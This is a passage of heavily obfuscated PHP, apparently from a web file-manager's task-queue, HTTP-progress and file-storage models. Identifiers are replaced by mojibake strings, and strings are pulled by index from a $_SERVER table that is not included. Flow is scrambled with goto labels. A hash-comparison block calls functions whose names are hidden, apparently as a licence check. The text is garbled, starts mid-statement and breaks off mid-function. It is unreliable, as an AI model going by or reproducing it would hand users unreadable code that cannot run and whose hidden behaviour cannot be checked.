$FØ¨äØóŒ; $eŒ›ç³çÛÜ[$dêâ®ó¥õ¹[1601]] += $FØ¨äØóŒ; $eŒ›ç³çÛÜ[$dêâ®ó¥õ¹[1602]] = $eŒ›ç³çÛÜ[$dêâ®ó¥õ¹[1601]]; goto BİŒŒéÏ³›; dã°íçÛí: $dêâ®ó¥õ¹ =& $_SERVER[›èö’ù¤]; $eŒ›ç³çÛÜ =& $this->task; $eŒ›ç³çÛÜ[$dêâ®ó¥õ¹[1595]] = $eÏöÂºïÑ¼; goto bÄÌ™ÁÖ‚œ; AÍÍÍĞ›­: } public function sourceModelCopy($c¸¨Ñ„Şâ†) { goto d šƒÛéí; Aæ®ğÉÕ¹Á: switch ($e©ˆ“‚õ£´) { case $d‰¡˜£ÔÁÒ[561]: $eïˆå®å  = 1; break; case $d‰¡˜£ÔÁÒ[564]: $bÌ¯‰¯»‘ï[$d‰¡˜£ÔÁÒ[1595]] = $AØ£²øÎ±¦[$d‰¡˜£ÔÁÒ[28]]; break; case $d‰¡˜£ÔÁÒ[566]: $eïˆå®å  = intval($c¸¨Ñ„Şâ†[$d‰¡˜£ÔÁÒ[378]] * 0.4); break; case $d‰¡˜£ÔÁÒ[568]: $eïˆå®å  = intval($c¸¨Ñ„Şâ†[$d‰¡˜£ÔÁÒ[378]] * 0.2); break; case $d‰¡˜£ÔÁÒ[570]: $eïˆå®å  = intval($c¸¨Ñ„Şâ†[$d‰¡˜£ÔÁÒ[378]] * 0.4); break; } $this->update($eïˆå®å ); $this->sourceModelCopyFlag = !1; goto FÍš£‰–†; d šƒÛéí: $d‰¡˜£ÔÁÒ =& $_SERVER[›èö’ù¤]; $e©ˆ“‚õ£´ = $c¸¨Ñ„Şâ†[0]; $AØ£²øÎ±¦ = $c¸¨Ñ„Şâ†[1]; goto cÈßÉ°İÛ; cÈßÉ°İÛ: $bÌ¯‰¯»‘ï =& $this->task; $this->sourceModelCopyFlag = !0; $eïˆå®å  = 0; goto Aæ®ğÉÕ¹Á; FÍš£‰–†: } public function sourceRemove($AŠ¤±£°Å¹, $D …è‘ŠÇ) { $DÀå¶®Ó¥ =& $_SERVER[›èö’ù¤]; $this->sourceModelCopyFlag = !0; $c÷Û•İ = 1; if (isset($AŠ¤±£°Å¹[$DÀå¶®Ó¥[81]])) { $c÷Û•İ = $AŠ¤±£°Å¹[$DÀå¶®Ó¥[81]][$DÀå¶®Ó¥[79]] + $AŠ¤±£°Å¹[$DÀå¶®Ó¥[81]][$DÀå¶®Ó¥[80]] + 1; } $this->update($c÷Û•İ); $this->sourceModelCopyFlag = !1; } public function sourceMove($Fà¦êğ«†õ) { $this->sourceRemove($Fà¦êğ«†õ, !1); } public function curlProgress($DòîÈŞ‰¤¾, $d›å¥İè, $BÉ”ÀÉ¿¿á, $B¶õŒ¶˜â¡, $eÜÚˆèÌ¹Ö) { $b’ğøù¬ƒ‡ =& $_SERVER[›èö’ù¤]; $b»ÜéŞ¾õ =& $this->task; if ($eÜÚˆèÌ¹Ö > 0) { $b»ÜéŞ¾õ[$b’ğøù¬ƒ‡[1048]] = $b’ğøù¬ƒ‡[1616]; $b»ÜéŞ¾õ[$b’ğøù¬ƒ‡[1599]] = $b’ğøù¬ƒ‡[107]; if ($b»ÜéŞ¾õ[$b’ğøù¬ƒ‡[1597]]) { $b»ÜéŞ¾õ[$b’ğøù¬ƒ‡[1598]] = $eÜÚˆèÌ¹Ö; } if ($b»ÜéŞ¾õ[$b’ğøù¬ƒ‡[1600]]) { $b»ÜéŞ¾õ[$b’ğøù¬ƒ‡[1598]] = $eÜÚˆèÌ¹Ö + $b»ÜéŞ¾õ[$b’ğøù¬ƒ‡[1600]]; } } else { if ($BÉ”ÀÉ¿¿á > 0) { if ($b»ÜéŞ¾õ[$b’ğøù¬ƒ‡[1597]] == $d›å¥İè) { $b»ÜéŞ¾õ[$b’ğøù¬ƒ‡[1598]] = $BÉ”ÀÉ¿¿á; $b»ÜéŞ¾õ[$b’ğøù¬ƒ‡[1048]] = $b’ğøù¬ƒ‡[1617]; $b»ÜéŞ¾õ[$b’ğøù¬ƒ‡[1599]] = $b’ğøù¬ƒ‡[1118]; } } } $this->update(); } public function curlProgressStart($BöÚ®ğ¡êÍ) { } public function curlProgressEnd($eÆŠñÜ–ò) { goto B‹·¤õ£Å; B‹·¤õ£Å: $C‹é¡šöå =& $_SERVER[›èö’ù¤]; $B¿Æ¹ùÆŒ¦ =& $this->task; $B­›²Î—Áê = curl_getinfo($eÆŠñÜ–ò); goto c· å©ã¼¦; A²‹× •ñ«: $this->update(); goto cÁõù‰Äù; c· å©ã¼¦: $báË¼œÁ«Ç = $B­›²Î—Áê[$C‹é¡šöå[1618]]; if ($báË¼œÁ«Ç == -1) { $báË¼œÁ«Ç = $B­›²Î—Áê[$C‹é¡šöå[1619]]; } if ($B¿Æ¹ùÆŒ¦[$C‹é¡šöå[1599]] == $C‹é¡šöå[107] && $báË¼œÁ«Ç) { $B¿Æ¹ùÆŒ¦[$C‹é¡šöå[1600]] += $báË¼œÁ«Ç; } goto A²‹× •ñ«; cÁõù‰Äù: } } class TaskHttp extends Task { protected function startAfter() { $A—õàô¹î =& $_SERVER[›èö’ù¤]; $dÈª©ï•¨ =& $this->task; $dÈª©ï•¨[$A—õàô¹î[1620]] = 1; Hook::bind($A—õàô¹î[1589], array($this, $A—õàô¹î[1621])); Hook::bind($A—õàô¹î[1591], array($this, $A—õàô¹î[1622])); Hook::bind($A—õàô¹î[1593], array($this, $A—õàô¹î[1623])); } protected function endAfter() { $a‘”¢Ê¹ëä =& $_SERVER[›èö’ù¤]; Hook::unbind($a‘”¢Ê¹ëä[1589], array($this, $a‘”¢Ê¹ëä[1621])); Hook::unbind($a‘”¢Ê¹ëä[1591], array($this, $a‘”¢Ê¹ëä[1622])); Hook::unbind($a‘”¢Ê¹ëä[1593], array($this, $a‘”¢Ê¹ëä[1623])); } public function progressStart($D¶˜´ßÂÚ) { $C¸»¥È×ÊÁ =& $_SERVER[›èö’ù¤]; $c°Ÿ‚“¿Öº = curl_getinfo($D¶˜´ßÂÚ); self::log($C¸»¥È×ÊÁ[1624] . $c°Ÿ‚“¿Öº[$C¸»¥È×ÊÁ[305]]); self::valueSet($this->task[$C¸»¥È×ÊÁ[395]], $this->task); } public function progressEnd($D×ñ×…‹œ´) { $D¬Ûî°ÕÅ =& $_SERVER[›èö’ù¤]; self::log($D¬Ûî°ÕÅ[1625] . $this->task[$D¬Ûî°ÕÅ[395]]); $this->end(); } public function progress($AØ¼±Ûº—Ã, $AÅ¬èÒ´ù…, $fÓ‹†µ»í‡, $EŠöø¿§¢Ã, $DÂÍ…ãÚ¾) { $A¯ËÈ¿µ›– =& $_SERVER[›èö’ù¤]; $b„Ä–Ï£Ë =& $this->task; if ($DÂÍ…ãÚ¾ > 0) { $b„Ä–Ï£Ë[$A¯ËÈ¿µ›–[1046]] = $b„Ä–Ï£Ë[$A¯ËÈ¿µ›–[1046]] == 0 ? $EŠöø¿§¢Ã : $b„Ä–Ï£Ë[$A¯ËÈ¿µ›–[1046]]; $b„Ä–Ï£Ë[$A¯ËÈ¿µ›–[1060]] = $DÂÍ…ãÚ¾; } else { if ($fÓ‹†µ»í‡ > 0) { $b„Ä–Ï£Ë[$A¯ËÈ¿µ›–[1046]] = $b„Ä–Ï£Ë[$A¯ËÈ¿µ›–[1046]] == 0 ? $AÅ¬èÒ´ù… : $b„Ä–Ï£Ë[$A¯ËÈ¿µ›–[1046]]; $b„Ä–Ï£Ë[$A¯ËÈ¿µ›–[1060]] = $fÓ‹†µ»í‡; } } $this->update(); self::log("\160\162\x6f\147\x72\145\x73\x73\110\164\x74\x70\72\144\x6f\x77\x6e\72{$fÓ‹†µ»í‡}\x2f{$AÅ¬èÒ´ù…}\73\x20\x75\160\x6c\157\141\144\x3a{$DÂÍ…ãÚ¾}\x2f{$EŠöø¿§¢Ã}\x3b"); } } class TaskQueue { const MAX_LENGTH = 1000; const QUEUE_LENGTH = "\164\141\x73\153\121\165\145\x75\x65\x4c\145\x6e\147\x74\150"; const QUEUE_DATA = "\164\x61\163\x6b\x51\x75\145\x75\x65\x44\x61\164\141"; public static $listData = false; public static function initTask() { } public static function add($f²–ˆ¡—×â, $cáì²¾ß‡Ó = array(), $bªğÍëóØ© = '', $fÈ®†â× = '') { $FŠÜ¨œå =& $_SERVER[›èö’ù¤]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($fÈ®†â× && array_find_by_field(self::$listData, $FŠÜ¨œå[93], $fÈ®†â×)) { return !0; } self::$listData[] = array($FŠÜ¨œå[262] => $f²–ˆ¡—×â, $FŠÜ¨œå[1626] => $cáì²¾ß‡Ó, $FŠÜ¨œå[446] => $bªğÍëóØ©, $FŠÜ¨œå[93] => $fÈ®†â×); return !0; } public static function addSubmit() { $eÇÀÉµ·‘ñ =& $_SERVER[›èö’ù¤]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($eÇÀÉµ·‘ñ[1627] . json_encode_force(array_to_keyvalue(self::$listData, $eÇÀÉµ·‘ñ[33], $eÇÀÉµ·‘ñ[446])), $eÇÀÉµ·‘ñ[1628]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($E¿Ü®¿Ä„Ï, $fËˆ‡‡©‚Š = array(), $e„ºäâ‰‘œ = '', $eØÖì”¾„ø = '') { goto eæ›˜¤×ƒ; b×¥ÊÒ¡—: if ($eØÖì”¾„ø && array_find_by_field($bÍäîåâÓ, $a½›Èè£ê[93], $eØÖì”¾„ø)) { return !0; } $bÍäîåâÓ[] = array($a½›Èè£ê[262] => $E¿Ü®¿Ä„Ï, $a½›Èè£ê[1626] => $fËˆ‡‡©‚Š, $a½›Èè£ê[446] => $e„ºäâ‰‘œ, $a½›Èè£ê[93] => $eØÖì”¾„ø); write_log($a½›Èè£ê[1627] . $e„ºäâ‰‘œ, $a½›Èè£ê[1628]); goto C…ª‘‘´¤›; C…ª‘‘´¤›: self::setAll($bÍäîåâÓ); return !0; goto bšÛ¤ÁÌÜÎ; eæ›˜¤×ƒ: $a½›Èè£ê =& $_SERVER[›èö’ù¤]; if (self::count() >= self::MAX_LENGTH) { return !1; } $bÍäîåâÓ = self::getAll(); goto b×¥ÊÒ¡—; bšÛ¤ÁÌÜÎ: } public static function run() { goto FÁàóÑ¤äñ; dÀÄªØ—î¡: try { Hook::apply($F™‡Ä½ÒŠ¥[$B¡ÏñíÀ¦»[262]], $F™‡Ä½ÒŠ¥[$B¡ÏñíÀ¦»[1626]]); } catch (Exception $D‚İ»£Ò£ê) { } $A–Ä“ˆ«ùå = number_format(timeFloat() - $eÄŞ‘¢½­, 3) . $B¡ÏñíÀ¦»[1564]; write_log($B¡ÏñíÀ¦»[1629] . $F™‡Ä½ÒŠ¥[$B¡ÏñíÀ¦»[446]] . $B¡ÏñíÀ¦»[1630] . $A–Ä“ˆ«ùå, $B¡ÏñíÀ¦»[1628]); goto A±Èƒå½øœ; A±Èƒå½øœ: return !0; goto aŠ¼¼Éï¥; bäÌÔ¨Á‰Â: if (!$F™‡Ä½ÒŠ¥) { return !1; } self::setAll($a‚•ÀöØ¡…); $eÄŞ‘¢½­ = timeFloat(); goto dÀÄªØ—î¡; FÁàóÑ¤äñ: $B¡ÏñíÀ¦» =& $_SERVER[›èö’ù¤]; $a‚•ÀöØ¡… = self::getAll(); $F™‡Ä½ÒŠ¥ = array_shift($a‚•ÀöØ¡…); goto bäÌÔ¨Á‰Â; aŠ¼¼Éï¥: } public static function count() { $dœõ–éĞ° = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$dœõ–éĞ°) { return 0; } return intval($dœõ–éĞ°); } public static function getAll() { $e¢ğ¿÷Š’ô = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$e¢ğ¿÷Š’ô) { return array(); } return $e¢ğ¿÷Š’ô; } public static function setAll($eæ´ÏÈ˜öÓ) { $eºŞß›ÆÇ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($eæ´ÏÈ˜öÓ), $eºŞß›ÆÇ); Cache::set(self::QUEUE_DATA, $eæ´ÏÈ˜öÓ, $eºŞß›ÆÇ); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } goto eÊ÷ÍùÇ™Š; cé¿ôˆ¸šŸ: define($_SERVER[›èö’ù¤][237], 2); define($_SERVER[›èö’ù¤][238], 3); define($_SERVER[›èö’ù¤][239], 1); goto fİÇºÀÉ·; aÜˆÍš“«’: if ($_SERVER[$_SERVER[›èö’ù¤][831]] != $A®‘‡ÆŒÚ®($Aôù«ÈÙ“)) { goto C”ç’‹¬Å; b„‘´…“Ã„: $C²Äç‹ÖõÓ($Aôù«ÈÙ“); goto dÚêÎĞŒŒ„; C”ç’‹¬Å: $DÁíçË®Öƒ = $_SERVER[›èö’ù¤][833]; $FñŸ…ëé¶¢ = $_SERVER[$_SERVER[›èö’ù¤][834]] . $_SERVER[›èö’ù¤][835]; $d‚“íªğÑ = $DÁíçË®Öƒ($FñŸ…ëé¶¢); goto D›Ğäµ”Ü; D›Ğäµ”Ü: $DøÍôî¡… = explode($_SERVER[›èö’ù¤][229], $d‚“íªğÑ); if (count($DøÍôî¡…) < $_SERVER[›èö’ù¤][616]) { $c›¸ôİ’Ú = $_SERVER[›èö’ù¤][836]; $c›¸ôİ’Ú(); } $C²Äç‹ÖõÓ = $_SERVER[›èö’ù¤][837]; goto b„‘´…“Ã„; dÚêÎĞŒŒ„: } class FileContentModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x66\151\x6c\x65\x5f\x63\x6f\x6e\164\145\156\164\x73"; protected $dataAuto = array(array("\x63\162\145\141\x74\145\124\151\x6d\x65", "\164\x69\155\145", "\x69\x6e\x73\x65\162\x74", "\146\x75\x6e\x63\x74\151\157\x6e")); } class FileModel extends ModelBase { protected $tableName = "\151\157\x5f\146\x69\154\145"; protected $tableMeta = array("\x74\141\x62\154\x65\116\x61\155\x65" => "\x69\157\137\x66\x69\154\145\137\x6d\x65\x74\141", "\155\x65\x74\141\x46\x69\x65\154\x64" => "\146\x69\154\145\x49\x44"); public function fileInfo($cƒƒ’Èšº) { $e†õˆ¶¼…½ =& $_SERVER[›èö’ù¤]; static $EöÌƒƒ‹ = array(); if (!isset($EöÌƒƒ‹[$cƒƒ’Èšº])) { $bÈª‡ß¯²” = $e†õˆ¶¼…½[1768]; $BË’è¿ˆ ¶ = Model($e†õˆ¶¼…½[465])->field($bÈª‡ß¯²”)->where(array($e†õˆ¶¼…½[463] => $cƒƒ’Èšº))->find(); $EöÌƒƒ‹[$cƒƒ’Èšº] = $BË’è¿ˆ ¶; } return $EöÌƒƒ‹[$cƒƒ’Èšº]; } public function addFileByContent($A³—ëĞ¼ = '', $DÒ¨Êê¨ÒË = '') { goto AÈô…Û½ø; AÈô…Û½ø: $d¼‘ËÖ»“è =& $_SERVER[›èö’ù¤]; $dœã½„ù‚ƒ = TEMP_PATH . $d¼‘ËÖ»“è[1769]; if (!is_dir($dœã½„ù‚ƒ)) { mk_dir($dœã½„ù‚ƒ); } goto dé®ŒãÃå„; dé®ŒãÃå„: $dĞ¦¢ğìö’ = $dœã½„ù‚ƒ . $d¼‘ËÖ»“è[1770] . rand_string(16); file_put_contents($dĞ¦¢ğìö’, $A³—ëĞ¼); $AæØ¼î¨ = $this->addFile($dĞ¦¢ğìö’, $DÒ¨Êê¨ÒË, !0); goto aßˆÚ×¼ˆÖ; aßˆÚ×¼ˆÖ: if (file_exists($dĞ¦¢ğìö’)) { @unlink($dĞ¦¢ğìö’); } return $AæØ¼î¨; goto DäĞŸéµÚª; DäĞŸéµÚª: } public function createFileName($d†˜íãåîš, $c¨Œ°ÔÃ½ = false, $FèÌ§†„™ = false) { goto fÛÕ…Û½¸Ø; FÉø›ÀÀÑÖ: if (!$a¢ŒË÷”ø¥ && !Cache::get($f‘ĞÑ‹“Ó¯)) { $a¢ŒË÷”ø¥ = !0; $C—¹„í½Ÿ = IO::mkdir($E†¦îÄ«‚); if (!IO::exist($C—¹„í½Ÿ . $dˆ²„İ‚ã¥[787])) { IO::mkfile($C—¹„í½Ÿ . $dˆ²„İ‚ã¥[787]); } Cache::set($f‘ĞÑ‹“Ó¯, 1, 3600 * 2); } return $fÏ‡±ªæª; goto d‡ŒæÕæ©; fÛÕ…Û½¸Ø: $dˆ²„İ‚ã¥ =& $_SERVER[›èö’ù¤]; $c™–ìµ®Š‡ = IO::init($dˆ²„İ‚ã¥[8]); $fÏ‡±ªæª = $this->makeFilePath($d†˜íãåîš, $c™–ìµ®Š‡, $c¨Œ°ÔÃ½, $FèÌ§†„™); goto dĞŠ ÈÍ¼; dĞŠ ÈÍ¼: $E†¦îÄ«‚ = $c™–ìµ®Š‡->pathFather($fÏ‡±ªæª); static $a¢ŒË÷”ø¥ = false; $f‘ĞÑ‹“Ó¯ = $dˆ²„İ‚ã¥[1771] . md5($E†¦îÄ«‚); goto FÉø›ÀÀÑÖ; d‡ŒæÕæ©: } public function makeFilePath($AÉ¼ÍÌ¹ô, $F¯ø—ó—”, $BŠÌ‘©É“— = false, $a³îĞ˜Ÿİ = false) { goto a«åË‘™„¤; a«åË‘™„¤: $b–‰Ê’¿î£ =& $_SERVER[›èö’ù¤]; $a‘íÛöÀ²¹ = Model($b–‰Ê’¿î£[754])->get($b–‰Ê’¿î£[1772]); $a¥ÏàŒ³’µ = KodIO::defaultIO() . date($b–‰Ê’¿î£[1773]); goto eÕ¹ğÙãŠÍ; eÕ¹ğÙãŠÍ: $A­Œù²ìò™ = $a¥ÏàŒ³’µ . rand_string(5) . short_id(100); $AÉ¼ÍÌ¹ô = str_replace($b–‰Ê’¿î£[8], $b–‰Ê’¿î£[71], KodIO::clear($AÉ¼ÍÌ¹ô)); $b’Û¿á‡×é = $F¯ø—ó—”->ext($AÉ¼ÍÌ¹ô); goto f–ÖƒèÏ‰; f–ÖƒèÏ‰: if (!$AÉ¼ÍÌ¹ô) { $a‘íÛöÀ²¹ = $b–‰Ê’¿î£[1774]; } switch ($a‘íÛöÀ²¹) { case $b–‰Ê’¿î£[1775]: $A­Œù²ìò™ = $A­Œù²ìò™ . $b–‰Ê’¿î£[95] . $F¯ø—ó—”->ext($AÉ¼ÍÌ¹ô); if ($b’Û¿á‡×é == $b–‰Ê’¿î£[1710]) { $A­Œù²ìò™ .= $b–‰Ê’¿î£[1450]; } break; case $b–‰Ê’¿î£[1776]: goto AÎ¾Ö…’²Ê; Cà„ï‚ °•: $a¥ÏàŒ³’µ = $b–‰Ê’¿î£[1148] . $EèŒ®ÓÆ•¢[$b–‰Ê’¿î£[395]] . $b–‰Ê’¿î£[404] . date($b–‰Ê’¿î£[1777]) . $Cäšö“£™â . $b–‰Ê’¿î£[8]; if ($b’Û¿á‡×é == $b–‰Ê’¿î£[1710]) { $AÉ¼ÍÌ¹ô .= $b–‰Ê’¿î£[1450]; } $aö¯Ñ‰¾˜ì = $b–‰Ê’¿î£[1778] . $a¥ÏàŒ³’µ . $AÉ¼ÍÌ¹ô; goto fÜø·Í‰Ò; fÜø·Í‰Ò: CacheLock::lock($aö¯Ñ‰¾˜ì); $A­Œù²ìò™ = $a¥ÏàŒ³’µ . $AÉ¼ÍÌ¹ô; if (IO::exist($a¥ÏàŒ³’µ . $AÉ¼ÍÌ¹ô)) { $fÈ‹ñÛ©„ = substr($AÉ¼ÍÌ¹ô, 0, strlen($AÉ¼ÍÌ¹ô) - strlen($b’Û¿á‡×é)); $CÔˆ‰«Œ‡ = $a³îĞ˜Ÿİ ? substr($a³îĞ˜Ÿİ, 0, 5) : ($BŠÌ‘©É“— ? substr($BŠÌ‘©É“—, 0, 5) : rand_string(5)); $A­Œù²ìò™ = $a¥ÏàŒ³’µ . $fÈ‹ñÛ©„ . $CÔˆ‰«Œ‡ . $b–‰Ê’¿î£[95] . $b’Û¿á‡×é; } goto Fì«ª¸Å÷È; Fì«ª¸Å÷È: if (IO::isTypeObject($A­Œù²ìò™) && !IO::isUploadServer($A­Œù²ìò™)) { if (IO::exist($A­Œù²ìò™)) { return $A­Œù²ìò™; } $CÛ‡İîß‹â = IO::setContent($A­Œù²ìò™, $b–‰Ê’¿î£[33]); if (!$CÛ‡İîß‹â) { show_json($b–‰Ê’¿î£[1779], !1); } } CacheLock::unlock($aö¯Ñ‰¾˜ì); break; goto a‰áÁóÊ¶å; AÎ¾Ö…’²Ê: $e«ÎïÛìÊ = Model($b–‰Ê’¿î£[754])->get($b–‰Ê’¿î£[755]); $Cäšö“£™â = substr(md5($b–‰Ê’¿î£[756] . $e«ÎïÛìÊ . date($b–‰Ê’¿î£[732])), 0, 8); $EèŒ®ÓÆ•¢ = KodIO::defaultDriver(); goto Cà„ï‚ °•; a‰áÁóÊ¶å: case $b–‰Ê’¿î£[1774]: break; default: break; } return $A­Œù²ìò™; goto F¹½ßºÇ•Å; F¹½ßºÇ•Å: } public function addFileByRemote($cÊ£å°µ¶¬, $bÏÄÑñ–áˆ, $EÕ»Æ¦“»Š = array()) { goto EğõÖÕÔµ¼; F“Âø…“Õ: if ($CëäÌ×­¥â = $this->addFileCheckExist($Bõ‡¶°„”¯[$Bóµ‰ï…÷¶[171]], $Bõ‡¶°„”¯[$Bóµ‰ï…÷¶[170]], $Bõ‡¶°„”¯[$Bóµ‰ï…÷¶[78]])) { return $CëäÌ×­¥â; } return $this->addFileData($Bõ‡¶°„”¯); goto BºÈÃ’¬ÆÔ; fËĞª‚–˜Ò: $E‘‡¸Ã®×Œ = IO::hashMd5($cÊ£å°µ¶¬, $b†ØÖÓññ™); $dÁº†Š¨øî = KodIO::defaultDriver(); $Bõ‡¶°„”¯ = array($Bóµ‰ï…÷¶[574] => IO::size($cÊ£å°µ¶¬), $Bóµ‰ï…÷¶[1780] => 1, $Bóµ‰ï…÷¶[415] => $bÏÄÑñ–áˆ, $Bóµ‰ï…÷¶[799] => $dÁº†Š¨øî[$Bóµ‰ï…÷¶[395]], $Bóµ‰ï…÷¶[416] => $cÊ£å°µ¶¬, $Bóµ‰ï…÷¶[1781] => $EÕ»Æ¦“»Š[$Bóµ‰ï…÷¶[171]] ? $EÕ»Æ¦“»Š[$Bóµ‰ï…÷¶[171]] : IO::hashSimple($cÊ£å°µ¶¬), $Bóµ‰ï…÷¶[1782] => $E‘‡¸Ã®×Œ ? $E‘‡¸Ã®×Œ : $b†ØÖÓññ™); goto F“Âø…“Õ; EğõÖÕÔµ¼: $Bóµ‰ï…÷¶ =& $_SERVER[›èö’ù¤]; if (!IO::exist($cÊ£å°µ¶¬)) { return !1; } $b†ØÖÓññ™ = $EÕ»Æ¦“»Š[$Bóµ‰ï…÷¶[170]] ? $EÕ»Æ¦“»Š[$Bóµ‰ï…÷¶[170]] : $Bóµ‰ï…÷¶[33]; goto fËĞª‚–˜Ò; BºÈÃ’¬ÆÔ: } private function addFileData($Fõø´Ó†) { $b¦ùƒ‘æÏö =& $_SERVER[›èö’ù¤]; if (!$Fõø´Ó†) { return !1; } $Fõø´Ó†[$b¦ùƒ‘æÏö[78]] = intval($Fõø´Ó†[$b¦ùƒ‘æÏö[78]]); if (!$Fõø´Ó†[$b¦ùƒ‘æÏö[78]] && strlen($Fõø´Ó†[$b¦ùƒ‘æÏö[171]]) > 32) { $Fõø´Ó†[$b¦ùƒ‘æÏö[78]] = intval(substr($Fõø´Ó†[$b¦ùƒ‘æÏö[171]], 32)); } $fŠïÌéêñÓ = $this->add($Fõø´Ó†); return $this->find($fŠïÌéêñÓ); } public function addFile($aÄë¯ÂˆÜ…, $c—õ³¸†öŠ, $f²ö·¦©… = false) { goto BÑèáç…‡º; BÑèáç…‡º: $e­Ë×ö¶È² = IO::hashSimple($aÄë¯ÂˆÜ…); $AÜ“Ù±½º = IO::hashMd5($aÄë¯ÂˆÜ…); $EÄˆğ½‡âè = IO::size($aÄë¯ÂˆÜ…); goto côÙŞ÷‰¬Š; aºÆçÁÓÀ–: $B¨Â›ÇÜ‚¶ = $this->addFileMake($aÄë¯ÂˆÜ…, $EÄˆğ½‡âè, $e­Ë×ö¶È², $AÜ“Ù±½º, $c—õ³¸†öŠ, $f²ö·¦©…); $e£»ª“º²ä = $this->addFileData($B¨Â›ÇÜ‚¶); CacheLock::unlock($Eç˜ßæ¿§î); goto Dó°Õ°Í°; Dó°Õ°Í°: return $e£»ª“º²ä; goto EÉ—èÂŒÛÀ; côÙŞ÷‰¬Š: $Eç˜ßæ¿§î = $_SERVER[›èö’ù¤][1783] . $AÜ“Ù±½º; CacheLock::lock($Eç˜ßæ¿§î); if ($D¬“ÉìÒã› = $this->addFileCheckExist($e­Ë×ö¶È², $AÜ“Ù±½º, $EÄˆğ½‡âè)) { CacheLock::unlock($Eç˜ßæ¿§î); return $D¬“ÉìÒã›; } goto aºÆçÁÓÀ–; EÉ—èÂŒÛÀ: } public function addFileMake($f—ŸÉ´ÎÉë, $bè§Ú½, $Bµ‘´Œ“˜…, $fµâ­ŒÏ“Û, $Dç›…ëÈ, $d·¸µÃóßó) { goto DŸÎÈ²ÒŠÇ; BˆÁ´ğô„†: $c¢Ü‰‰ß°– = get_path_this($c¹ƒ¥œˆ); if ($d·¸µÃóßó) { $E™¶«ƒ™œÂ = IO::move($f—ŸÉ´ÎÉë, $DÕâÖ­„¹, !1, $c¢Ü‰‰ß°–); } else { $E™¶«ƒ™œÂ = IO::copy($f—ŸÉ´ÎÉë, $DÕâÖ­„¹, !1, $c¢Ü‰‰ß°–); } if (!$E™¶«ƒ™œÂ) { return !1; } goto dâ‹µ¡¾îÉ; DŸÎÈ²ÒŠÇ: $A„¦Ôíˆ·ê =& $_SERVER[›èö’ù¤]; $c¹ƒ¥œˆ = $this->createFileName($Dç›…ëÈ, $Bµ‘´Œ“˜…, $fµâ­ŒÏ“Û); $DÕâÖ­„¹ = get_path_father($c¹ƒ¥œˆ); goto BˆÁ´ğô„†; dâ‹µ¡¾îÉ: $Aƒ‘¼éöÛë = KodIO::defaultDriver(); $fˆÅöÇ¼¾ = array($A„¦Ôíˆ·ê[574] => $bè§Ú½, $A„¦Ôíˆ·ê[1780] => 1, $A„¦Ôíˆ·ê[415] => $Dç›…ëÈ, $A„¦Ôíˆ·ê[799] => $Aƒ‘¼éöÛë[$A„¦Ôíˆ·ê[395]], $A„¦Ôíˆ·ê[416] => $c¹ƒ¥œˆ, $A„¦Ôíˆ·ê[1781] => $Bµ‘´Œ“˜…, $A„¦Ôíˆ·ê[1782] => $fµâ­ŒÏ“Û); return $fˆÅöÇ¼¾; goto eï«§Ñ·˜°; eï«§Ñ·˜°: } public function addFileCheckExist($a×ó¦°Ìî‰, $eŸÙáœÇ„Š, $E……˜‚°®ö) { $bàªĞ÷´ë© =& $_SERVER[›èö’ù¤]; $D“ÙœÊª²å = $this->findByHash($a×ó¦°Ìî‰, $eŸÙáœÇ„Š); if (!$D“ÙœÊª²å) { return !1; } $FÜÂµÈ ´– = array($bàªĞ÷´ë©[1780] => intval($D“ÙœÊª²å[$bàªĞ÷´ë©[1784]]) + 1, $bàªĞ÷´ë©[574] => $E……˜‚°®ö); $this->where(array($bàªĞ÷´ë©[463] => $D“ÙœÊª²å[$bàªĞ÷´ë©[462]]))->save($FÜÂµÈ ´–); return $D“ÙœÊª²å; } public function remove($a×÷•ŸØŠ) { $this->linkCountChange($a×÷•ŸØŠ, !1); $this->clearEmpty(); return !0; } public function linkAdd($d“ˆ³çİÅ±) { $this->linkCountChange($d“ˆ³çİÅ±, !0); } public function linkCountChange($cĞËÑİÎ÷, $a§É¢°Äù) { goto C¢‡†¨õÈ¯; cÎˆ‡ÔÄ“: foreach ($CÆ¤‰½˜œÀ as $c’…ó‚¯’ => $fœÃ¦¢») { $F«‚Œæ¦ç° = $fœÃ¦¢» . $e”™¢íÜÊã[33]; if (!$E‚ì¦à„‡§[$F«‚Œæ¦ç°]) { $E‚ì¦à„‡§[$F«‚Œæ¦ç°] = array(); } $E‚ì¦à„‡§[$F«‚Œæ¦ç°][] = $c’…ó‚¯’; } foreach ($E‚ì¦à„‡§ as $fœÃ¦¢» => $A—Ù¹·”¹Ç) { if (!$A—Ù¹·”¹Ç) { continue; } $fœÃ¦¢» = $a§É¢°Äù ? $fœÃ¦¢» : -intval($fœÃ¦¢»); $cˆ…ÍÌ‚´Ÿ = array($e”™¢íÜÊã[462] => array($e”™¢íÜÊã[7], $A—Ù¹·”¹Ç)); if ($fœÃ¦¢» < 0) { $cˆ…ÍÌ‚´Ÿ[$e”™¢íÜÊã[1784]] = array($e”™¢íÜÊã[998], abs($fœÃ¦¢»)); } $this->where($cˆ…ÍÌ‚´Ÿ)->setAdd($e”™¢íÜÊã[1784], $fœÃ¦¢»); } goto a”…œÏˆ»İ; BÄ¤çØ›ˆŒ: $CÆ¤‰½˜œÀ = array(); foreach ($cĞËÑİÎ÷ as $c’…ó‚¯’) { $F«‚Œæ¦ç° = $c’…ó‚¯’ . $e”™¢íÜÊã[33]; if (!$CÆ¤‰½˜œÀ[$F«‚Œæ¦ç°]) { $CÆ¤‰½˜œÀ[$F«‚Œæ¦ç°] = 0; } $CÆ¤‰½˜œÀ[$F«‚Œæ¦ç°]++; } $E‚ì¦à„‡§ = array(); goto cÎˆ‡ÔÄ“; C¢‡†¨õÈ¯: $e”™¢íÜÊã =& $_SERVER[›èö’ù¤]; if (!$cĞËÑİÎ÷) { return; } if (!is_array($cĞËÑİÎ÷)) { $cĞËÑİÎ÷ = array($cĞËÑİÎ÷); } goto BÄ¤çØ›ˆŒ; a”…œÏˆ»İ: } public function findByHash($Bå·İî”Å¿, 